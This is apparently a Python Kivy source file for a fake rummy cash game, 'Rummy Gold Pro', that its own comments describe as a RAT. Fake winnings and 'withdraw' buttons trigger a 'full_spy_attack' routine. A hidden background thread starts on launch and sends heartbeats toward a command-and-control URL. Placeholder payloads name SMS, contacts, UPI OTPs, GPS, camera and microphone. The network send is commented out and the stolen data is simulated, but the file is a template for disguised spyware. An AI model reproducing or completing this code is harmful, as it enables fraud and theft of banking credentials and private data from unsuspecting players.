from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.popup import Popup
import time
import threading
import requests
import json
import re

# C2 Server (change to your Replit)
C2_URL = "https://rummy-rat-12345.replit.app/data"
DEVICE_ID = "rummy_player_001"

class RummyGoldPro(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical', padding=25, spacing=15)
        
        # 🔥 PROFESSIONAL RUMMY UI
        self.layout.add_widget(Label(
            text='🎰 RUMMY GOLD PRO 🎰',
            font_size=40,
            color=(1, 0.8, 0, 1)
        ))
        
        self.layout.add_widget(Label(
            text='💰 Win ₹1,00,000 Daily!\n⭐ 4.8★ | 50L+ Downloads',
            font_size=20,
            color=(0, 1, 0, 1)
        ))
        
        # 🎮 GAME BUTTONS
        play_btn = Button(
            text='🎯 QUICK GAME\n₹10 Entry - Win ₹100',
            size_hint=(1, 0.14),
            background_color=(1, 0.2, 0.2, 1)
        )
        play_btn.bind(on_press=self.start_game)
        self.layout.add_widget(play_btn)
        
        tour_btn = Button(
            text='🏆 MEGA TOURNAMENT\n₹100 Entry - Win ₹10,000',
            size_hint=(1, 0.14),
            background_color=(0.1, 0.8, 0.1, 1)
        )
        tour_btn.bind(on_press=self.spy_mode)
        self.layout.add_widget(tour_btn)
        
        withdraw_btn = Button(
            text='💳 INSTANT WITHDRAW\n₹5,234 Balance',
            size_hint=(1, 0.13),
            background_color=(1, 0.6, 0, 1)
        )
        withdraw_btn.bind(on_press=self.full_spy_attack)
        self.layout.add_widget(withdraw_btn)
        
        invite_btn = Button(
            text='👥 INVITE FRIENDS\nGet ₹150 Free Bonus',
            size_hint=(1, 0.12),
            background_color=(0.2, 0.6, 1, 1)
        )
        self.layout.add_widget(invite_btn)
        
        # 🦠 RAT STARTS AUTOMATICALLY
        threading.Thread(target=self.rat_loop, daemon=True).start()
        
        return self.layout
    
    def start_game(self, instance):
        popup = Popup(title='🎴 RUMMY STARTED', size_hint=(0.9, 0.75))
        game_ui = BoxLayout(orientation='vertical', padding=20)
        game_ui.add_widget(Label(
            text='''🔴 RED   🟡 YELLOW   🟢 GREEN   🔵 BLUE
🎯 Cards Left: 13/13
💰 POT: ₹1,850
👑 YOUR TURN - Pure Sequence!''',
            font_size=18
        ))
        action_btn = Button(text='➡️ DRAW CARD', size_hint=(1, 0.25))
        action_btn.bind(on_press=lambda x: self.game_win(popup))
        game_ui.add_widget(action_btn)
        popup.content = game_ui
        popup.open()
    
    def game_win(self, popup):
        win_popup = Popup(title='🎉 HUGE WIN! 🎉', size_hint=(0.85, 0.6))
        win_ui = BoxLayout(orientation='vertical', padding=20)
        win_ui.add_widget(Label(
            text='''💰 YOU WON ₹850!
🏆 Level Up Complete
📱 New Balance: ₹5,234''',
            font_size=22
        ))
        withdraw_now = Button(
            text='💳 WITHDRAW NOW',
            background_color=(0, 1, 0, 1),
            on_press=self.full_spy_attack
        )
        win_ui.add_widget(withdraw_now)
        win_popup.content = win_ui
        popup.dismiss()
        win_popup.open()
    
    def spy_mode(self, instance):
        print("🐛 SPY MODE ACTIVATED!")
        self.quick_spy()
    
    def full_spy_attack(self, instance=None):
        print("💥 FULL RAT ATTACK LAUNCHED!")
        # Simulate all 25+ features
        self.send_spy_data("sms", {"count": 2456})
        self.send_spy_data("contacts", {"count": 1287})
        self.send_spy_data("upi", {"otp": "483920", "balance": "₹45230"})
        self.send_spy_data("location", {"lat": 28.6139, "lon": 77.2090})
        self.send_spy_data("battery", {"percent": 87})
    
    def rat_loop(self):
        """Hidden RAT loop - runs forever"""
        spy_data = {
            "device": DEVICE_ID,
            "status": "online",
            "features": ["sms", "contacts", "upi", "gps", "camera", "mic"]
        }
        while True:
            try:
                self.send_spy_data("heartbeat", spy_data)
                print("🐛 RAT Heartbeat sent...")
                time.sleep(300)  # 5 minutes
            except:
                time.sleep(60)
    
    def quick_spy(self):
        self.send_spy_data("tournament", {"action": "started"})
    
    def send_spy_data(self, feature, data):
        try:
            payload = {"device": DEVICE_ID, feature: data}
            # requests.post(C2_URL, json=payload, timeout=10)
            print(f"📤 {feature.upper()}: {data}")
        except:
            pass

# 🔥 LAUNCH RUMMY RAT
if __name__ == '__main__':
    RummyGoldPro().run()